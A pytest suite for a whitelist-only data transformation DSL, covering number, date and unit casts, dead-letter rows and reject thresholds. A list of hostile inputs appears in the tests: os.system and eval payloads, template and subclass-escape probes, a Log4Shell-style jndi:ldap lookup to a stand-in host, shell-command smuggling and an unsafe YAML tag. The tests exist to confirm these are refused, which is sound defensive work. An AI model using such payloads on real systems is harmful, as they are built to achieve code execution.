"""Safe declarative transformations (P3-05): whitelist DSL, validation, per-row dead-letter."""

import json
from datetime import UTC, date, datetime
from pathlib import Path
from typing import Any, get_args

import pytest
from hypothesis import given, settings
from hypothesis import strategies as st
from structlog.testing import capture_logs

from adp.bronze.store import LocalStore
from adp.connectors.files import RawTable, read_file
from adp.errors import AdpError, MappingError, TransformError
from adp.mapping.dictionary import load_dictionary
from adp.mapping.transform import (
    ALLOWED_OPS,
    MAX_MAP_ENTRIES,
    MAX_STEPS,
    MAX_TEXT,
    MAX_VALUE_LEN,
    DateFormat,
    TransformRule,
    apply_rule,
    bind_rules,
    load_field_transforms,
    parse_field_transforms,
    transform_table,
    transform_with_deadletter,
    validate_rules,
)
from adp.schema.profile import DATE_FORMATS

ROOT = Path(__file__).resolve().parents[2]
DICT = load_dictionary(ROOT / "config" / "semantic" / "canonical.yaml")
TRANSFORMS = ROOT / "config" / "semantic" / "transforms.yaml"
DRIFT = ROOT / "tests" / "data" / "drift"
T0 = datetime(2026, 11, 8, 10, 0, tzinfo=UTC)
D0 = date(2026, 11, 8)


def rule(*steps: dict[str, Any], src: str = "c", target: str = "x") -> TransformRule:
    return validate_rules([{"source_col": src, "target": target, "steps": list(steps)}])[0]


def run(value: str | None, *steps: dict[str, Any]) -> Any:
    return apply_rule(rule(*steps), value)


def refused(raw: object, **kw: Any) -> TransformError:
    with pytest.raises(TransformError) as ei:
        validate_rules(raw, **kw)
    return ei.value


# --- whitelist / hostile rules ------------------------------------------------------------


def test_error_hierarchy() -> None:
    assert issubclass(TransformError, MappingError) and issubclass(TransformError, AdpError)


def test_unknown_op_refused_with_allowed_list() -> None:
    err = refused([{"source_col": "c", "target": "x", "steps": [{"op": "shell"}]}])
    msg = str(err)
    assert "unknown op" in msg and "shell" not in msg
    for op in ("cast", "parse_date", "strip", "map_values", "unit_convert"):
        assert op in ALLOWED_OPS and op in msg


HOSTILE = [
    "__import__('os').system('touch {m}')",
    "eval(\"open('{m}','w')\")",
    "exec(\"open('{m}','w')\")",
    "lambda: open('{m}','w')",
    "{{{{7*7}}}}",
    "${{jndi:ldap://evil/{m}}}",
    "().__class__.__bases__[0].__subclasses__()",
    "`touch {m}`",
    "x; touch {m}",
]


@pytest.mark.parametrize("payload", HOSTILE)
def test_hostile_text_in_any_code_field_is_refused_without_execution(
    payload: str, tmp_path: Path
) -> None:
    marker = tmp_path / "pwned"
    p = payload.format(m=marker)
    base = {"source_col": "c", "target": "population_total"}
    variants: list[dict[str, Any]] = [
        {**base, "steps": [{"op": p}]},
        {**base, "steps": [{"op": "cast", "to": p}]},
        {**base, "steps": [{"op": "parse_date", "format": p}]},
        {**base, "steps": [{"op": "cast", "to": "float"},
                           {"op": "unit_convert", "from_unit": p, "to_unit": "ratio"}]},
        {**base, "steps": [{"op": "map_values", "values": {}, "on_missing": p}]},
        {**base, "target": p, "steps": [{"op": "strip"}]},
        {**base, "steps": [{"op": "strip", p: 1}]},
        {**base, p: "x", "steps": [{"op": "strip"}]},
        {**base, "steps": [{"op": "round", "digits": p}]},
    ]  # fmt: skip
    for v in variants:
        refused([v])
        refused(json.loads(json.dumps([v])))  # same through a JSON (LLM) round trip
    assert not marker.exists()


def test_spy_objects_are_never_coerced_or_called() -> None:
    calls: list[str] = []

    class Spy:
        def __str__(self) -> str:
            calls.append("str")
            return "strip"

        def __call__(self, *a: object) -> None:
            calls.append("call")

        def __format__(self, spec: str) -> str:
            calls.append("format")
            return "strip"

        def __int__(self) -> int:
            calls.append("int")
            return 1

        def __index__(self) -> int:
            calls.append("index")
            return 1

    spy = Spy()
    refused([{"source_col": spy, "target": "x", "steps": [{"op": "strip"}]}])
    refused([{"source_col": "c", "target": spy, "steps": [{"op": "strip"}]}])
    refused([{"source_col": "c", "target": "x", "steps": [{"op": "cast", "to": spy}]}])
    refused([{"source_col": "c", "target": "x", "steps": [{"op": "round", "digits": spy}]}])
    refused([{"source_col": "c", "target": "x", "steps": [
        {"op": "map_values", "values": {"a": spy}, "on_missing": "keep"}]}])  # fmt: skip
    assert calls == []


def test_data_fields_are_data_never_code(tmp_path: Path) -> None:
    marker = tmp_path / "pwned"
    evil = f"__import__('os').system('touch {marker}')"
    r = rule(
        {"op": "map_values", "values": {"import": "export", evil: "{{7*7}}"}, "on_missing": "keep"}
    )
    assert apply_rule(r, "import") == "export"
    assert apply_rule(r, evil) == "{{7*7}}"
    assert apply_rule(r, "${jndi:ldap://x}") == "${jndi:ldap://x}"
    # a hostile-looking source column name is only an opaque lookup key
    t = RawTable(["{{7*7}}"], [["5"]])
    res = transform_table(
        t, [rule({"op": "cast", "to": "integer"}, src="{{7*7}}")], source="s", run_id="r"
    )
    assert res.rows == [[5]]
    assert not marker.exists()


def test_extra_fields_forbidden_and_wrong_shapes() -> None:
    refused([{"source_col": "c", "target": "x", "steps": [{"op": "strip"}], "code": "1"}])
    refused([{"source_col": "c", "target": "x", "steps": [{"op": "cast", "to": "integer",
                                                           "fn": "int"}]}])  # fmt: skip
    refused("not rules")
    refused([42])
    refused({"rules": [], "extra": 1})
    refused([{"source_col": "c", "target": "x", "steps": []}])
    refused([{"source_col": "c", "target": "Bad Name", "steps": [{"op": "strip"}]}])


def test_bounds_refused() -> None:
    too_many = [{"op": "strip"}] * (MAX_STEPS + 1)
    refused([{"source_col": "c", "target": "x", "steps": too_many}])
    refused([{"source_col": "c" * (MAX_TEXT + 1), "target": "x", "steps": [{"op": "strip"}]}])
    huge = {f"k{i}": "v" for i in range(MAX_MAP_ENTRIES + 1)}
    refused([{"source_col": "c", "target": "x", "steps": [
        {"op": "map_values", "values": huge, "on_missing": "keep"}]}])  # fmt: skip
    long_value = {"op": "map_values", "values": {"a": "v" * (MAX_TEXT + 1)}, "on_missing": "keep"}
    refused([{"source_col": "c", "target": "x", "steps": [long_value]}])
    refused([{"source_col": "c", "target": "x", "steps": [{"op": "round", "digits": 99}]}])
    refused([{"source_col": "c", "target": "x", "steps": [{"op": "null_if", "values": []}]}])
    with pytest.raises(TransformError):
        run("1" * (MAX_VALUE_LEN + 1), {"op": "cast", "to": "integer"})


def test_type_flow_between_steps() -> None:
    # unit_convert needs a number: cast must come first
    refused([{"source_col": "c", "target": "x", "steps": [
        {"op": "unit_convert", "from_unit": "percent", "to_unit": "ratio"}]}])  # fmt: skip
    refused([{"source_col": "c", "target": "x", "steps": [
        {"op": "cast", "to": "integer"}, {"op": "strip"}]}])  # fmt: skip
    refused([{"source_col": "c", "target": "x", "steps": [
        {"op": "cast", "to": "date"}, {"op": "round", "digits": 1}]}])  # fmt: skip
    rule({"op": "cast", "to": "float"}, {"op": "unit_convert", "from_unit": "percent",
                                         "to_unit": "ratio"})  # fmt: skip


def test_unit_pairs_whitelisted() -> None:
    for a, b in (("percent", "USD"), ("ratio", "million"), ("EUR", "USD"), ("USD", "USD")):
        refused([{"source_col": "c", "target": "x", "steps": [
            {"op": "cast", "to": "float"},
            {"op": "unit_convert", "from_unit": a, "to_unit": b}]}])  # fmt: skip


def test_date_format_whitelist_matches_profiler_formats() -> None:
    assert set(get_args(DateFormat)) == {f for f, _ in DATE_FORMATS} | {"%Y-%m"}


def test_parse_date_requires_explicit_ambiguity_choice() -> None:
    refused([{"source_col": "c", "target": "x", "steps": [{"op": "parse_date"}]}])
    refused([{"source_col": "c", "target": "x", "steps": [{"op": "parse_date", "format": "%s"}]}])


def test_dictionary_targets_and_final_type() -> None:
    ok = [{"source_col": "annee", "target": "year", "steps": [{"op": "cast", "to": "integer"}]}]
    assert validate_rules(ok, dictionary=DICT)[0].target == "year"
    refused([{**ok[0], "target": "not_a_field"}], dictionary=DICT)
    refused([{**ok[0], "steps": [{"op": "strip"}]}], dictionary=DICT)  # string into integer
    refused([{**ok[0], "steps": [{"op": "cast", "to": "date"}]}], dictionary=DICT)
    # integer into a float field is fine
    validate_rules([{"source_col": "p", "target": "gdp_current_usd",
                     "steps": [{"op": "cast", "to": "integer"}]}], dictionary=DICT)  # fmt: skip
    refused(ok + ok)  # two rules writing the same target


def test_yaml_safe_load_only(tmp_path: Path) -> None:
    p = tmp_path / "t.yaml"
    p.write_text("fields:\n  - !!python/object/apply:os.system ['touch x']\n")
    with pytest.raises(TransformError):
        load_field_transforms(p)
    p.write_text("fields:\n  - target: year\n    steps: [{op: 'cast', to: integer}]\n")
    assert list(load_field_transforms(p)) == ["year"]
    with pytest.raises(TransformError):
        parse_field_transforms({"fields": [{"target": "year", "steps": [{"op": "eval"}]}]})


def test_llm_like_hostile_json_payload() -> None:
    raw = json.loads(
        '{"rules": [{"source_col": "taux", "target": "unemployment_rate", "steps": ['
        '{"op": "cast", "to": "float"}, {"op": "python", "code": "__import__(\\"os\\")"}]}]}'
    )
    refused(raw, dictionary=DICT)
    good = json.loads(
        '{"rules": [{"source_col": "taux", "target": "unemployment_rate", "steps": ['
        '{"op": "strip"}, {"op": "cast", "to": "float"}]}]}'
    )
    assert validate_rules(good, dictionary=DICT)[0].source_col == "taux"


# --- conversions --------------------------------------------------------------------------


def test_numbers_fr_en() -> None:
    assert run("1 080 551", {"op": "cast", "to": "integer"}) == 1080551
    assert run("1 080 551", {"op": "cast", "to": "integer"}) == 1080551
    assert run("1,234", {"op": "cast", "to": "integer"}) == 1234
    assert run("1.234,56", {"op": "cast", "to": "float"}) == 1234.56
    assert run("16,1 %", {"op": "cast", "to": "float"}) == 16.1
    assert run("  -3 ", {"op": "cast", "to": "integer"}) == -3
    assert run("12.0", {"op": "cast", "to": "integer"}) == 12
    for bad in ("12.5", "16 %", "abc", "007", "1e999"):
        with pytest.raises(TransformError):
            run(bad, {"op": "cast", "to": "integer"})
    with pytest.raises(TransformError):
        run("1e999", {"op": "cast", "to": "float"})


def test_percent_ratio_and_money_units() -> None:
    pct = {"op": "cast", "to": "float"}
    to_ratio = {"op": "unit_convert", "from_unit": "percent", "to_unit": "ratio"}
    assert run("16,1 %", pct, to_ratio) == 0.161
    assert run("0.161", pct, {"op": "unit_convert", "from_unit": "ratio",
                              "to_unit": "percent"}) == 16.1  # fmt: skip
    k = {"op": "unit_convert", "from_unit": "kUSD", "to_unit": "USD"}
    assert run("1 250,5", pct, k) == 1250500.0
    m = {"op": "unit_convert", "from_unit": "USD", "to_unit": "MUSD"}
    assert run("2500000", pct, m) == 2.5
    th = {"op": "unit_convert", "from_unit": "thousand", "to_unit": "unit"}
    assert run("1 080,551", pct, th, {"op": "cast", "to": "integer"}) == 1080551
    assert run("2.345", pct, {"op": "round", "digits": 1}) == 2.3


def test_dates() -> None:
    assert run("31/01/2024", {"op": "parse_date", "dayfirst": True}) == date(2024, 1, 31)
    assert run("03/04/2024", {"op": "parse_date", "dayfirst": True}) == date(2024, 4, 3)
    assert run("03/04/2024", {"op": "parse_date", "dayfirst": False}) == date(2024, 3, 4)
    assert run("2024-01-31", {"op": "parse_date", "dayfirst": False}) == date(2024, 1, 31)
    assert run("2024-03", {"op": "parse_date", "format": "%Y-%m"}) == date(2024, 3, 1)
    with pytest.raises(TransformError):
        run("31/01/2024", {"op": "parse_date", "dayfirst": False})
    assert run("2024-01-31", {"op": "cast", "to": "date"}) == date(2024, 1, 31)
    assert run("2024-01-31T10:00:00+00:00", {"op": "cast", "to": "datetime"}) == datetime(
        2024, 1, 31, 10, tzinfo=UTC
    )
    with pytest.raises(TransformError):
        run("31/01/2024", {"op": "cast", "to": "date"})


def test_booleans_fr_en() -> None:
    b = {"op": "cast", "to": "boolean"}
    for v, exp in (("oui", True), ("NON", False), ("Vrai", True), ("faux", False),
                   ("true", True), ("no", False), ("1", True), ("0", False)):  # fmt: skip
        assert run(v, b) is exp
    with pytest.raises(TransformError):
        run("peut-être", b)


def test_text_ops_map_values_null_if_and_none() -> None:
    assert run("  Rabat  ", {"op": "strip"}) == "Rabat"
    assert run("Rabat", {"op": "upper"}) == "RABAT"
    assert run("Rabat", {"op": "lower"}) == "rabat"
    mv = {"op": "map_values", "values": {"M": "male", "F": "female", "?": None}}
    assert run("M", {**mv, "on_missing": "error"}) == "male"
    assert run("?", {**mv, "on_missing": "error"}) is None
    assert run("X", {**mv, "on_missing": "keep"}) == "X"
    assert run("X", {**mv, "on_missing": "null"}) is None
    with pytest.raises(TransformError):
        run("X", {**mv, "on_missing": "error"})
    ni = {"op": "null_if", "values": ["N/A", "-", "", "null"]}
    for v in ("n/a", " - ", "", "NULL"):
        assert run(v, ni, {"op": "cast", "to": "integer"}) is None
    assert run("7", ni, {"op": "cast", "to": "integer"}) == 7
    assert run(None, {"op": "strip"}, {"op": "cast", "to": "integer"}) is None
    assert run("   ", {"op": "cast", "to": "float"}) is None


# --- table, dead-letter, threshold --------------------------------------------------------

SENTINEL = "SECRET-VALUE-42"


def _table(bad_rows: tuple[int, ...] = (10, 50, 90), n: int = 100) -> RawTable:
    rows: list[list[str | None]] = [[str(i), f"{i},5 %"] for i in range(1, n + 1)]
    for i in bad_rows:
        rows[i - 1][1] = SENTINEL
    return RawTable(["id", "taux"], rows)


RULES = [
    {"source_col": "id", "target": "year", "steps": [{"op": "cast", "to": "integer"}]},
    {"source_col": "taux", "target": "unemployment_rate", "steps": [{"op": "cast", "to": "float"}]},
]


def test_per_row_errors_go_to_dead_letter_without_values() -> None:
    rules = validate_rules(RULES, dictionary=DICT)
    with capture_logs() as logs:
        res = transform_table(_table(), rules, source="hcp", run_id="r1", now=lambda: T0)
    assert res.columns == ["year", "unemployment_rate"]
    assert (res.stats.rows_read, res.stats.rows_ok, res.stats.rows_rejected) == (100, 97, 3)
    assert res.stats.rows_ok + res.stats.rows_rejected == res.stats.rows_read
    assert len(res.rows) == 97 and res.rows[0] == [1, 1.5]
    assert [r.line_number for r in res.rejects] == [10, 50, 90]
    for r in res.rejects:
        assert r.reason == "transform_error:taux:cast"
        assert SENTINEL in r.raw_line and json.loads(r.raw_line)[1] == SENTINEL  # verbatim
        assert (r.source, r.run_id, r.rejected_at) == ("hcp", "r1", T0.isoformat())
    assert res.stats.by_reason == {"transform_error:taux:cast": 3}
    assert SENTINEL not in json.dumps(logs, default=str)
    assert SENTINEL not in str(res.stats)


def test_missing_source_column_fails_the_batch() -> None:
    rules = validate_rules([{"source_col": "absent", "target": "x", "steps": [{"op": "strip"}]}])
    with pytest.raises(TransformError, match="absent"):
        transform_table(_table(), rules, source="s", run_id="r")


def test_short_rows_are_nulls_not_crashes() -> None:
    t = RawTable(["id", "taux"], [["1"], ["2", "3"]])
    res = transform_table(t, validate_rules(RULES), source="s", run_id="r")
    assert res.rows == [[1, None], [2, 3.0]]


def test_threshold_and_idempotent_rejects(tmp_path: Path) -> None:
    store = LocalStore(tmp_path / "s")
    rules = validate_rules(RULES)
    kw: dict[str, Any] = {"source": "hcp", "run_id": "r1", "store": store, "day": D0,
                          "now": lambda: T0}  # fmt: skip
    res, path = transform_with_deadletter(_table(), rules, **kw)
    res2, path2 = transform_with_deadletter(_table(), rules, **kw)
    assert path == path2 and path is not None
    assert len([k for k in store.list("hcp/") if k.endswith(".jsonl")]) == 1
    lines = (tmp_path / "s" / path).read_text().splitlines()
    assert [json.loads(x)["line_number"] for x in lines] == [10, 50, 90]
    assert res == res2
    # >= 20 % rejected: batch fails, but rejects are stored first (nothing is lost)
    many = _table(bad_rows=tuple(range(1, 21)))
    with pytest.raises(TransformError, match="threshold") as ei:
        transform_with_deadletter(many, rules, **kw)
    assert SENTINEL not in str(ei.value)
    assert len([k for k in store.list("hcp/") if k.endswith(".jsonl")]) == 2
    res3, _ = transform_with_deadletter(many, rules, max_reject_rate=0.5, **kw)
    assert res3.stats.rows_rejected == 20


def test_clean_table_writes_nothing(tmp_path: Path) -> None:
    store = LocalStore(tmp_path / "s")
    res, path = transform_with_deadletter(
        _table(bad_rows=()), validate_rules(RULES), source="s", run_id="r", store=store, day=D0
    )
    assert path is None and res.stats.rows_ok == 100 and store.list() == []


# --- example config on drift fixtures -----------------------------------------------------


def _drift(version: str) -> tuple[list[str], list[list[Any]]]:
    table = read_file(DRIFT / version / "population.csv")
    fields = load_field_transforms(TRANSFORMS, dictionary=DICT)
    mapping = {c: f.name for c in table.columns if (f := DICT.lookup(c)) is not None}
    rules = bind_rules(fields, mapping)
    res = transform_table(table, rules, source="hcp", run_id=version, now=lambda: T0)
    assert res.stats.rows_rejected == 0 and res.stats.rows_ok == 48
    return res.columns, res.rows


def test_example_config_covers_dictionary() -> None:
    fields = load_field_transforms(TRANSFORMS, dictionary=DICT)
    assert set(fields) == {f.name for f in DICT.fields}


def test_example_config_types_drift_v1_v2_v3() -> None:
    c1, r1 = _drift("v1")
    c2, r2 = _drift("v2")
    c3, r3 = _drift("v3")
    assert c1 == c3 == ["region", "year", "population_total", "unemployment_rate"]
    assert c2 == [*c1, "activity_rate"]
    assert r1[0] == ["Tanger-Tétouan-Al Hoceïma", 2019, 1080551, 16.1]
    assert r3 == r1  # v3 "1 080 551" / "16,1 %" typed exactly like v1
    assert [row[:4] for row in r2] == r1
    for row in r3:
        assert isinstance(row[2], int) and isinstance(row[3], float)


def test_bind_rules_requires_a_transform_per_target() -> None:
    fields = load_field_transforms(TRANSFORMS, dictionary=DICT)
    with pytest.raises(TransformError):
        bind_rules(fields, {"c": "unknown_target"})


def test_deterministic() -> None:
    assert _drift("v3") == _drift("v3")


# --- property: only domain errors, for any text, on every op ------------------------------

PROPERTY_RULES = [
    rule({"op": "strip"}),
    rule({"op": "lower"}),
    rule({"op": "upper"}),
    rule({"op": "null_if", "values": ["N/A", "-"]}),
    rule({"op": "map_values", "values": {"a": "b"}, "on_missing": "error"}),
    rule({"op": "parse_date", "dayfirst": True}),
    rule({"op": "parse_date", "format": "%Y-%m"}),
    *[
        rule({"op": "cast", "to": t})
        for t in ("integer", "float", "string", "boolean", "date", "datetime")
    ],  # fmt: skip
    rule(
        {"op": "cast", "to": "float"},
        {"op": "unit_convert", "from_unit": "USD", "to_unit": "BUSD"},
        {"op": "round", "digits": 3},
    ),  # fmt: skip
    rule(
        {"op": "cast", "to": "float"},
        {"op": "unit_convert", "from_unit": "billion", "to_unit": "unit"},
        {"op": "cast", "to": "integer"},
    ),  # fmt: skip
]

TEXT = st.one_of(
    st.text(max_size=40),
    st.from_regex(r"[-+ 0-9.,%eE  /:T]{0,30}", fullmatch=True),
)


@settings(max_examples=200, derandomize=True, database=None, deadline=None)
@given(value=TEXT)
def test_apply_rule_only_raises_domain_errors(value: str) -> None:
    for r in PROPERTY_RULES:
        try:
            apply_rule(r, value)
        except TransformError:
            pass
